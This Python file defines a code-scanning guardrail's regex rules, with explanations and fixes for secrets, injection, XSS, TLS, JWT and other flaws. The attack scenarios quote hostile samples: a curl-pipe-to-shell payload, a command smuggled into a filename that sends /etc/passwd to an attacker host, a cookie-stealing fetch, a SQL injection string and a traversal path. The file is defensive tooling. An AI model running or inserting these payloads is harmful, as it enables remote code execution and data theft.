"""The pattern ruleset the guardrail runs against proposed code.

This is deliberately a fast, boring, deterministic layer. It runs on every diff
an agent wants to apply, so it has to be cheap. Its job is recall, not final
judgement - it decides *what deserves a look*, and the explainer decides what to
say about it.

Every rule carries its own hand-written `offline_explanation`. That is what makes
the tool useful with no API key, and it is also the floor the model-generated
explanation has to beat.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from ..models import Category, Severity

PY = (".py",)
JS = (".js", ".jsx", ".ts", ".tsx", ".mjs", ".cjs")
WEB = JS + (".html", ".vue", ".svelte")
ANY: tuple[str, ...] = ()


@dataclass(frozen=True)
class Rule:
    id: str
    name: str
    severity: Severity
    pattern: re.Pattern
    extensions: tuple[str, ...] = ANY
    category: Category = "code"
    cwe: tuple[str, ...] = ()
    offline_explanation: dict = field(default_factory=dict)
    # One line of code this rule is meant to catch. Optional, and never used by
    # the engine - it exists so the landing page can show a real before/after
    # pair taken from the ruleset instead of a hand-written imitation of one.
    # `scripts/sync_site.py` reads it; `tests/test_site_sync.py` keeps them
    # from drifting apart.
    example: str | None = None
    # A second pattern that, if it also matches the line, suppresses the finding.
    unless: re.Pattern | None = None
    # A second pattern that must ALSO match, anywhere on the line. Lets a rule
    # test two independent things without one regex having to span both.
    requires: re.Pattern | None = None

    def applies_to(self, filename: str) -> bool:
        if not self.extensions:
            return True
        return filename.lower().endswith(self.extensions)


def _r(pattern: str) -> re.Pattern:
    return re.compile(pattern, re.IGNORECASE)


RULES: list[Rule] = [
    # -- secrets ------------------------------------------------------------
    Rule(
        id="secret.aws-access-key",
        name="AWS access key ID committed to source",
        severity=Severity.CRITICAL,
        category="secret",
        pattern=re.compile(r"\b(AKIA|ASIA)[0-9A-Z]{16}\b"),
        cwe=("CWE-798",),
        offline_explanation={
            "headline": "An AWS key is about to be written into a source file.",
            "what_it_means": (
                "AWS access key IDs are long-lived credentials. Once one is in a git "
                "commit it is in the repository history forever, even if a later commit "
                "deletes the line."
            ),
            "attack_scenario": (
                "Bots scrape public and newly-public repositories for this exact string "
                "pattern, usually within minutes of a push. The typical outcome is spun-up "
                "compute on your account billed to you, plus read access to whatever the "
                "key's IAM policy allows."
            ),
            "fix_summary": "Read the key from the environment and rotate the exposed one.",
            "fix_steps": [
                "Do not commit this line.",
                "Move the value into an environment variable or your secret manager.",
                "If this key was ever committed anywhere, rotate it now - deleting the line is not enough.",
            ],
            "safer_pattern": 'aws_key = os.environ["AWS_ACCESS_KEY_ID"]',
            "exploit_likelihood": 5,
            "blast_radius": 5,
            "fix_effort": "quick",
        },
    ),
    Rule(
        id="secret.private-key",
        name="Private key material in source",
        severity=Severity.CRITICAL,
        category="secret",
        pattern=_r(r"-----BEGIN (RSA |EC |OPENSSH |PGP |DSA )?PRIVATE KEY-----"),
        cwe=("CWE-798",),
        offline_explanation={
            "headline": "A private key is being pasted into the repository.",
            "what_it_means": (
                "This is the secret half of a key pair. Anyone holding it can impersonate "
                "whatever the key authenticates - a server, a service account, a signing identity."
            ),
            "attack_scenario": (
                "Anyone with repository read access, now or in the future, can copy this key "
                "and authenticate as you. Repository access is much broader than production access."
            ),
            "fix_summary": "Keep the key out of git and load it from a secret store at runtime.",
            "fix_steps": [
                "Remove the key block from the file.",
                "Load it at runtime from a mounted file or secret manager.",
                "Rotate the key pair - assume this one is burned.",
            ],
            "exploit_likelihood": 5,
            "blast_radius": 5,
            "fix_effort": "quick",
        },
    ),
    Rule(
        id="secret.hardcoded-credential",
        name="Hardcoded credential assignment",
        severity=Severity.HIGH,
        category="secret",
        pattern=_r(
            r"(password|passwd|secret|api[_-]?key|access[_-]?token|auth[_-]?token|"
            r"client[_-]?secret)\s*[:=]\s*['\"][^'\"]{8,}['\"]"
        ),
        example='STRIPE_SECRET = "sk_live_51H8xQ2eZvKYlo2C"',
        # Placeholders and env lookups are fine.
        unless=_r(r"(os\.environ|process\.env|getenv|\$\{|<[^>]+>|xxx|placeholder|example|changeme|your[_-])"),
        cwe=("CWE-798",),
        offline_explanation={
            "headline": "A password or API key is being written directly into the code.",
            "what_it_means": (
                "The literal secret becomes part of the source, which means it is in git "
                "history, in every developer's checkout, in CI logs, and in any build artifact."
            ),
            "attack_scenario": (
                "A contractor with read access, a leaked laptop backup, or a repository that "
                "later goes public all hand this credential to someone who should not have it. "
                "Nothing has to be hacked for this to leak."
            ),
            "fix_summary": "Read the secret from the environment instead of hardcoding it.",
            "fix_steps": [
                "Replace the literal with an environment variable lookup.",
                "Add the real value to your local .env (and confirm .env is gitignored).",
                "Document the new variable in .env.example.",
            ],
            "safer_pattern": 'api_key = os.environ["SERVICE_API_KEY"]',
            "exploit_likelihood": 4,
            "blast_radius": 4,
            "fix_effort": "quick",
        },
    ),
    # -- injection ----------------------------------------------------------
    Rule(
        id="code.python-eval-exec",
        name="eval() or exec() on a non-literal value",
        severity=Severity.CRITICAL,
        extensions=PY,
        pattern=_r(r"\b(eval|exec)\s*\(\s*(?!['\"])[A-Za-z_]"),
        example="result = eval(request.args['expr'])",
        cwe=("CWE-94",),
        offline_explanation={
            "headline": "This runs a string as Python code.",
            "what_it_means": (
                "eval() and exec() hand whatever string they are given to the Python "
                "interpreter. If any part of that string can be influenced from outside, "
                "the caller is choosing what your program executes."
            ),
            "attack_scenario": (
                "Someone sends a value that reaches this call containing "
                "`__import__('os').system('curl attacker.sh | sh')`. Your process runs it with "
                "your service's permissions, database credentials and network access included."
            ),
            "fix_summary": "Parse the value instead of executing it.",
            "fix_steps": [
                "Work out what shape of value you actually expect - a number, a name, an expression.",
                "Use ast.literal_eval for data, or a lookup dict for a set of allowed operations.",
                "If you genuinely need arbitrary expressions, run them in a sandboxed subprocess.",
            ],
            "safer_pattern": "import ast\nvalue = ast.literal_eval(raw)  # data only, never code",
            "exploit_likelihood": 5,
            "blast_radius": 5,
            "fix_effort": "moderate",
        },
    ),
    Rule(
        id="code.shell-injection",
        name="Shell command built from a variable",
        severity=Severity.HIGH,
        # The `[+%]\s*[A-Za-z_]` tail is doing real work: it means "an operator
        # followed by a name", which catches `os.system("rm " + path)` but not
        # the `+` inside a constant like `os.system("echo 1+1")`. The previous
        # character class excluded quotes, so it silently missed the single
        # most common form of this bug.
        pattern=_r(
            r"(subprocess\.(run|call|check_output|Popen)\([^)]*shell\s*=\s*True"
            r"|os\.(system|popen)\s*\([^)]*([+%]\s*[A-Za-z_]|f['\"][^'\"]*\{|\.format\s*\()"
            r"|child_process\.exec(Sync)?\s*\(\s*[`\"'][^`\"']*\$\{"
            r"|child_process\.exec(Sync)?\s*\([^)]*\+\s*[A-Za-z_])"
        ),
        cwe=("CWE-78",),
        offline_explanation={
            "headline": "A shell command is being assembled from a variable.",
            "what_it_means": (
                "With a shell involved, characters like ; | && $() stop being text and start "
                "being instructions. Anything interpolated into the command string can add "
                "extra commands."
            ),
            "attack_scenario": (
                "A filename or ID that reaches this line contains `file.txt; curl attacker.com/$(cat /etc/passwd)`. "
                "The shell happily runs both halves."
            ),
            "fix_summary": "Pass the command as a list of arguments with no shell.",
            "fix_steps": [
                "Drop shell=True (or switch execFile for exec).",
                "Pass the program and each argument as separate list items.",
                "If you need shell features like pipes, build them in code instead.",
            ],
            "safer_pattern": 'subprocess.run(["convert", user_path, out_path], check=True)',
            "exploit_likelihood": 4,
            "blast_radius": 5,
            "fix_effort": "quick",
        },
    ),
    Rule(
        id="code.sql-string-building",
        name="SQL query built by string concatenation",
        severity=Severity.HIGH,
        # Two independent conditions: the query is built dynamically (pattern),
        # and it is actually SQL (requires). Checking them separately is what
        # keeps `execute("... WHERE id = %s", (uid,))` - the safe, parameterized
        # form - out of the results.
        pattern=_r(
            r"(execute|query|raw)\s*\([^)]*"
            r"(f['\"][^'\"]*\{|\$\{|['\"]\s*\+|['\"]\s*%\s*[\(\w]|\.format\s*\()"
        ),
        requires=_r(r"\b(select|insert|update|delete|drop)\b"),
        cwe=("CWE-89",),
        offline_explanation={
            "headline": "This builds a SQL query by gluing strings together.",
            "what_it_means": (
                "The database cannot tell which part of the finished string was your query "
                "and which part came from a user. Whatever gets interpolated can change the "
                "meaning of the statement."
            ),
            "attack_scenario": (
                "A user submits `' OR '1'='1` in a form field that lands here. The WHERE "
                "clause becomes always-true and the endpoint returns every row in the table "
                "instead of theirs."
            ),
            "fix_summary": "Use a parameterized query and let the driver handle the values.",
            "fix_steps": [
                "Replace the interpolated values with placeholders (? or %s or :name).",
                "Pass the values as the second argument to execute().",
                "Never interpolate a table or column name from user input - use an allow-list.",
            ],
            "safer_pattern": 'cur.execute("SELECT * FROM users WHERE email = %s", (email,))',
            "exploit_likelihood": 5,
            "blast_radius": 5,
            "fix_effort": "quick",
        },
    ),
    # -- deserialization ----------------------------------------------------
    Rule(
        id="code.unsafe-deserialization",
        name="Unsafe deserialization",
        severity=Severity.HIGH,
        pattern=_r(r"(pickle\.loads?|cPickle\.loads?|yaml\.load\s*\((?![^)]*Safe)|marshal\.loads)"),
        example="session = pickle.loads(request.data)",
        cwe=("CWE-502",),
        offline_explanation={
            "headline": "This turns bytes back into objects in a way that can run code.",
            "what_it_means": (
                "pickle and yaml.load do not just read data - they can construct arbitrary "
                "objects and call arbitrary functions as part of loading. The payload decides what."
            ),
            "attack_scenario": (
                "Someone sends a crafted payload to whatever feeds this call - a cache entry, "
                "an upload, a queue message. Loading it executes their code inside your process. "
                "There is no parsing step where you could have validated it first."
            ),
            "fix_summary": "Use a data-only format: JSON, or yaml.safe_load.",
            "fix_steps": [
                "Switch to json.loads, or yaml.safe_load if you need YAML.",
                "If the format must stay pickle, sign the payload and verify the signature before loading.",
                "Treat any pickle source you do not fully control as untrusted.",
            ],
            "safer_pattern": "data = yaml.safe_load(raw)   # or json.loads(raw)",
            "exploit_likelihood": 4,
            "blast_radius": 5,
            "fix_effort": "moderate",
        },
    ),
    # -- web ----------------------------------------------------------------
    Rule(
        id="code.xss-innerhtml",
        name="Untrusted value written to innerHTML",
        severity=Severity.MEDIUM,
        extensions=WEB,
        pattern=_r(r"(\.innerHTML\s*=(?!\s*['\"`]\s*['\"`])|dangerouslySetInnerHTML|document\.write\s*\()"),
        cwe=("CWE-79",),
        offline_explanation={
            "headline": "This puts a value into the page as HTML, not as text.",
            "what_it_means": (
                "innerHTML parses what you give it. If the value contains markup, the browser "
                "builds real elements from it - including ones that run scripts."
            ),
            "attack_scenario": (
                "A user sets their display name to an image tag with an onerror handler. Every "
                "other user who loads a page showing that name runs the attacker's script with "
                "their session - which usually means their account."
            ),
            "fix_summary": "Use textContent, or sanitize before inserting HTML.",
            "fix_steps": [
                "If you only need text, use textContent (or React's normal {value} interpolation).",
                "If you genuinely need HTML, run it through DOMPurify.sanitize first.",
                "Never build the HTML string by concatenating user input.",
            ],
            "safer_pattern": "el.textContent = userName;",
            "exploit_likelihood": 4,
            "blast_radius": 3,
            "fix_effort": "quick",
        },
    ),
    Rule(
        id="code.js-dynamic-eval",
        name="eval() or new Function() in JavaScript",
        severity=Severity.HIGH,
        extensions=JS,
        pattern=_r(r"(\beval\s*\(|new\s+Function\s*\()"),
        cwe=("CWE-94",),
        offline_explanation={
            "headline": "This runs a string as JavaScript.",
            "what_it_means": (
                "eval and new Function compile whatever string they receive. Any influence over "
                "that string is influence over what your application does."
            ),
            "attack_scenario": (
                "A value from a URL parameter, a stored record, or an API response reaches this "
                "call carrying `fetch('//attacker/'+document.cookie)`. It runs with full access "
                "to the page, including the user's session."
            ),
            "fix_summary": "Replace it with JSON.parse or an explicit dispatch table.",
            "fix_steps": [
                "If you are parsing data, use JSON.parse.",
                "If you are picking behaviour, map allowed names to functions in an object.",
                "Remove the dynamic execution path entirely - there is almost always a static equivalent.",
            ],
            "safer_pattern": "const handlers = { sum, mean };\nconst fn = handlers[name];",
            "exploit_likelihood": 4,
            "blast_radius": 4,
            "fix_effort": "moderate",
        },
    ),
    # -- transport / crypto -------------------------------------------------
    Rule(
        id="config.tls-verification-disabled",
        name="TLS certificate verification turned off",
        severity=Severity.HIGH,
        pattern=_r(
            r"(verify\s*=\s*False|rejectUnauthorized\s*:\s*false"
            r"|NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*['\"]?0|CURLOPT_SSL_VERIFYPEER\s*,\s*(false|0))"
        ),
        cwe=("CWE-295",),
        offline_explanation={
            "headline": "This connection will accept any certificate, including a forged one.",
            "what_it_means": (
                "Certificate verification is what makes HTTPS mean anything. With it off you "
                "still get encryption, but you have no idea who you are encrypting to."
            ),
            "attack_scenario": (
                "Anyone positioned between your service and the destination - a compromised "
                "network, a malicious proxy, a hostile wifi - presents their own certificate. "
                "Your client accepts it, and they read and rewrite every request, credentials included."
            ),
            "fix_summary": "Turn verification back on and fix the underlying certificate problem.",
            "fix_steps": [
                "Remove the flag that disables verification.",
                "If the failure was a self-signed internal cert, point the client at your CA bundle instead.",
                "If this was only ever meant for local development, gate it behind an explicit dev-only check.",
            ],
            "safer_pattern": 'requests.get(url, verify="/etc/ssl/certs/internal-ca.pem")',
            "exploit_likelihood": 3,
            "blast_radius": 4,
            "fix_effort": "quick",
        },
    ),
    Rule(
        id="code.weak-hash-for-password",
        name="Weak hash used for a password",
        severity=Severity.MEDIUM,
        pattern=_r(r"(md5|sha1)\s*\(\s*[^)]*(pass|pwd|secret|token)"),
        cwe=("CWE-327", "CWE-916"),
        offline_explanation={
            "headline": "Passwords are being hashed with an algorithm built for speed.",
            "what_it_means": (
                "MD5 and SHA-1 are fast by design. Password hashing needs to be slow, so that "
                "guessing is expensive. Fast hashing means a stolen table can be cracked in bulk."
            ),
            "attack_scenario": (
                "If your user table ever leaks, commodity hardware tests billions of MD5 guesses "
                "per second. Common passwords fall in seconds, and people reuse them on other sites."
            ),
            "fix_summary": "Use a password hashing function: bcrypt, scrypt, or Argon2.",
            "fix_steps": [
                "Switch new password hashing to bcrypt or Argon2 with a per-user salt.",
                "Re-hash existing passwords on next successful login.",
                "Record which algorithm each stored hash used so you can migrate gradually.",
            ],
            "safer_pattern": "import bcrypt\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())",
            "exploit_likelihood": 3,
            "blast_radius": 4,
            "fix_effort": "moderate",
        },
    ),
    Rule(
        id="code.jwt-verification-skipped",
        name="JWT signature not verified",
        severity=Severity.CRITICAL,
        pattern=_r(
            r"(verify_signature['\"]?\s*:\s*False|jwt\.decode\([^)]*verify\s*=\s*False"
            r"|algorithms\s*[:=]\s*\[?\s*['\"]none['\"]|jwt\.decode\((?![^)]*(secret|key|algorithms)))"
        ),
        cwe=("CWE-347",),
        offline_explanation={
            "headline": "A JWT is being read without checking that it is genuine.",
            "what_it_means": (
                "A JWT is just base64 text. The signature is the only thing that proves your "
                "server issued it. Skipping verification means trusting whatever the client sent."
            ),
            "attack_scenario": (
                "A user decodes their own token, changes `\"role\": \"user\"` to `\"role\": \"admin\"`, "
                "re-encodes it and sends it back. Nothing checks the signature, so they are an admin. "
                "This takes about two minutes with a browser console."
            ),
            "fix_summary": "Verify the signature with your key and an explicit algorithm.",
            "fix_steps": [
                "Pass the signing key to decode and require the algorithm you actually use.",
                "Never accept the 'none' algorithm.",
                "Also check the expiry, issuer and audience claims.",
            ],
            "safer_pattern": 'claims = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"], audience=AUD)',
            "exploit_likelihood": 5,
            "blast_radius": 5,
            "fix_effort": "quick",
        },
    ),
    # -- path / SSRF --------------------------------------------------------
    Rule(
        id="code.path-traversal",
        name="File path joined from an outside value",
        severity=Severity.MEDIUM,
        pattern=_r(
            r"(open\s*\(\s*(os\.path\.join\s*\()?[^)'\"]*\+|"
            r"os\.path\.join\s*\([^)]*\b(request|params|query|body|args|user|input)\b|"
            r"fs\.(readFile|writeFile|createReadStream)(Sync)?\s*\(\s*[`'\"]?[^,)]*\$\{)"
        ),
        cwe=("CWE-22",),
        offline_explanation={
            "headline": "A file path is being built from a value that may come from outside.",
            "what_it_means": (
                "Path joins do not stop at your directory. A value containing ../ walks upward, "
                "and an absolute path replaces the base entirely."
            ),
            "attack_scenario": (
                "A download endpoint receives `../../../../etc/passwd`, or on a write path, "
                "something that lands in a directory your app later executes. Either way the "
                "caller picked the file, not you."
            ),
            "fix_summary": "Resolve the final path and confirm it is still inside the base directory.",
            "fix_steps": [
                "Join the path, then call resolve() on the result.",
                "Check the resolved path is a child of your intended base directory; reject it otherwise.",
                "Where you can, look the file up by ID in a database instead of by name.",
            ],
            "safer_pattern": (
                "target = (BASE / name).resolve()\n"
                "if not target.is_relative_to(BASE.resolve()):\n"
                "    raise ValueError('path escapes base directory')"
            ),
            "exploit_likelihood": 3,
            "blast_radius": 4,
            "fix_effort": "moderate",
        },
    ),
    # -- config -------------------------------------------------------------
    Rule(
        id="config.debug-enabled",
        name="Debug mode enabled",
        severity=Severity.MEDIUM,
        category="config",
        pattern=_r(r"(debug\s*=\s*True|DEBUG\s*[:=]\s*true|app\.run\([^)]*debug\s*=\s*True)"),
        cwe=("CWE-489",),
        offline_explanation={
            "headline": "Debug mode is being switched on.",
            "what_it_means": (
                "Debug mode shows stack traces, local variable values and configuration to "
                "whoever triggers an error. In some frameworks it also exposes an interactive "
                "console."
            ),
            "attack_scenario": (
                "An attacker triggers any error and reads the traceback: file paths, library "
                "versions, sometimes database credentials sitting in a local variable. With "
                "Flask's debugger reachable, that becomes remote code execution."
            ),
            "fix_summary": "Drive debug from an environment variable that defaults to off.",
            "fix_steps": [
                "Replace the literal True with a config lookup.",
                "Make the default false, so production is safe even if the variable is missing.",
                "Confirm your deploy config does not set it.",
            ],
            "safer_pattern": 'DEBUG = os.environ.get("APP_DEBUG", "").lower() == "true"',
            "exploit_likelihood": 3,
            "blast_radius": 3,
            "fix_effort": "quick",
        },
    ),
    Rule(
        id="config.permissive-cors",
        name="CORS open to every origin",
        severity=Severity.MEDIUM,
        category="config",
        pattern=_r(r"Access-Control-Allow-Origin['\"]?\s*[:,]\s*['\"]\*|origin\s*:\s*['\"]\*['\"]"),
        cwe=("CWE-942",),
        offline_explanation={
            "headline": "Any website will be allowed to call this API from a user's browser.",
            "what_it_means": (
                "A wildcard CORS origin tells browsers to drop the protection that normally "
                "stops one site from reading another site's responses."
            ),
            "attack_scenario": (
                "A user visits an unrelated page while logged into your app. That page calls "
                "your API from their browser and reads the response. If credentials ride along, "
                "it reads their data."
            ),
            "fix_summary": "List the origins you actually serve.",
            "fix_steps": [
                "Replace * with an explicit list of your front-end origins.",
                "Keep the list in configuration so environments can differ.",
                "Never combine a wildcard origin with credentialed requests.",
            ],
            "exploit_likelihood": 3,
            "blast_radius": 3,
            "fix_effort": "quick",
        },
    ),
]

RULES_BY_ID: dict[str, Rule] = {rule.id: rule for rule in RULES}

# Manifest files where a new line means a new dependency entering the project.
# These do not produce a failing verdict on their own - they produce the
# "should this package be here at all?" question (see README, pitch #4).
DEPENDENCY_MANIFESTS = (
    "package.json",
    "requirements.txt",
    "pyproject.toml",
    "Pipfile",
    "go.mod",
    "Gemfile",
    "pom.xml",
    "build.gradle",
    "Cargo.toml",
)

COMMENT_PREFIXES = ("#", "//", "*", "/*", "<!--", '"""', "'''")


def is_comment(line: str) -> bool:
    return line.lstrip().startswith(COMMENT_PREFIXES)


# A line that *defines* a pattern is describing dangerous code, not running it.
# Without this, any file containing a security ruleset trips nearly every rule
# it defines - this file matches its own eval/exec rule on the literal text
# "exec(" inside a regex. Linters hit the same problem and solve it the same
# way. Deliberately narrow: only a line that STARTS with a raw-string literal
# (a continuation inside a multi-line pattern) or that names the regex module.
# `cmd = r"rm -rf " + path` is still real code and is still caught.
PATTERN_DEFINITION = re.compile(
    r"""(^\s*(?:r|rb|br)['"]|\bre\.(?:compile|search|match|sub|findall)\s*\(|\bpattern\s*=)""",
    re.IGNORECASE,
)


def is_pattern_definition(line: str) -> bool:
    return bool(PATTERN_DEFINITION.search(line))
